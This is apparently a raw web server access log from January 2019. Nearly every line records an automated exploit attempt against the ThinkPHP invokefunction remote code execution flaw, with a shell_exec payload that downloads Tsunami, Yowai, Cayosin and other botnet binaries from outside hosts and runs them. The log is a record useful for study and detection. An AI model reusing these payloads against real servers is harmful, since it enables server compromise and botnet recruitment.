82.47.156.228 - - [25/Jan/2019:12:27:26 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

1.215.205.157 - - [25/Jan/2019:13:52:51 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

42.119.194.186 - - [25/Jan/2019:13:54:08 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

126.58.237.63 - - [25/Jan/2019:14:04:33 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

43.230.197.4 - - [25/Jan/2019:14:53:22 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

162.244.81.232 - - [25/Jan/2019:15:08:10 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

42.117.207.158 - - [25/Jan/2019:15:08:58 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://185.244.25.139/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

91.148.174.153 - - [25/Jan/2019:15:56:04 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

176.175.104.231 - - [25/Jan/2019:16:03:37 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

64.68.245.69 - - [25/Jan/2019:16:35:26 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

185.244.25.243 - - [25/Jan/2019:17:27:25 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

162.244.81.232 - - [25/Jan/2019:18:33:19 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

61.121.238.84 - - [25/Jan/2019:18:44:45 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

180.46.119.157 - - [25/Jan/2019:18:59:05 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

5.2.224.146 - - [25/Jan/2019:19:25:21 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.145/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

189.134.81.243 - - [25/Jan/2019:19:44:18 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

85.96.175.63 - - [25/Jan/2019:19:49:40 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.145/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

194.113.106.126 - - [25/Jan/2019:20:33:38 +0330] "" 400 0 "-" "-" "-"

85.99.114.34 - - [25/Jan/2019:20:50:19 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

115.59.27.99 - - [25/Jan/2019:21:53:14 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

1.215.205.157 - - [25/Jan/2019:22:43:08 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

112.80.208.59 - - [25/Jan/2019:23:41:58 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

162.244.80.47 - - [25/Jan/2019:23:44:47 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

111.176.101.195 - - [25/Jan/2019:23:51:26 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

185.105.4.172 - - [26/Jan/2019:00:18:52 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

61.86.79.193 - - [26/Jan/2019:00:36:52 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

153.145.147.89 - - [26/Jan/2019:00:51:05 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

31.163.44.102 - - [26/Jan/2019:01:54:24 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://178.128.245.144/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

37.29.32.137 - - [26/Jan/2019:02:05:18 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

42.118.10.161 - - [26/Jan/2019:02:20:06 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

5.188.218.203 - - [26/Jan/2019:02:27:19 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

85.197.162.91 - - [26/Jan/2019:03:29:33 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

92.56.8.28 - - [26/Jan/2019:03:30:29 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

162.244.80.47 - - [26/Jan/2019:03:31:11 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

42.118.10.161 - - [26/Jan/2019:04:11:00 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

61.86.79.193 - - [26/Jan/2019:04:23:08 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

36.89.106.19 - - [26/Jan/2019:05:06:28 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

213.41.230.66 - - [26/Jan/2019:05:53:47 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://178.128.245.144/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

121.84.86.234 - - [26/Jan/2019:06:53:02 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

5.141.84.60 - - [26/Jan/2019:06:54:22 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.145/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

185.105.4.172 - - [26/Jan/2019:07:29:14 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

185.244.25.243 - - [26/Jan/2019:07:38:14 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

126.58.237.63 - - [26/Jan/2019:08:35:02 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

203.177.173.46 - - [26/Jan/2019:09:28:16 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

80.252.153.95 - - [26/Jan/2019:09:49:23 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

162.244.81.232 - - [26/Jan/2019:10:49:47 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

162.244.80.47 - - [26/Jan/2019:12:03:52 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

36.106.21.29 - - [26/Jan/2019:12:33:22 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/bins/sefa.x86 -O /tmp/.sefa; chmod 777 /tmp/.sefa; /tmp/.sefa sefa.x86' HTTP/1.1" 400 166 "-" "sefa/2.0" "-"

162.244.80.47 - - [26/Jan/2019:13:12:07 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

83.172.35.53 - - [26/Jan/2019:13:38:44 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.145/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

117.198.103.115 - - [26/Jan/2019:14:35:34 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

125.165.180.211 - - [26/Jan/2019:14:59:11 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 301 178 "-" "Cayosin/2.0" "-"

162.244.80.47 - - [26/Jan/2019:15:21:28 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

203.115.99.150 - - [26/Jan/2019:15:26:17 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.145/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

99.100.6.45 - - [26/Jan/2019:17:00:13 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

92.56.8.28 - - [26/Jan/2019:17:04:42 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

162.220.144.211 - - [26/Jan/2019:17:43:16 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

110.14.105.47 - - [26/Jan/2019:18:30:07 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

91.238.210.203 - - [26/Jan/2019:18:58:57 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

185.105.4.172 - - [26/Jan/2019:19:14:26 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

192.99.203.185 - - [26/Jan/2019:19:24:08 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://damienondek.ga/bins/Damien.x86 -O /tmp/.Damien; chmod 777 /tmp/.Damien; /tmp/.Damien php.x86' HTTP/1.1" 400 166 "-" "Damien/2.0" "-"

78.208.45.38 - - [26/Jan/2019:19:24:51 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

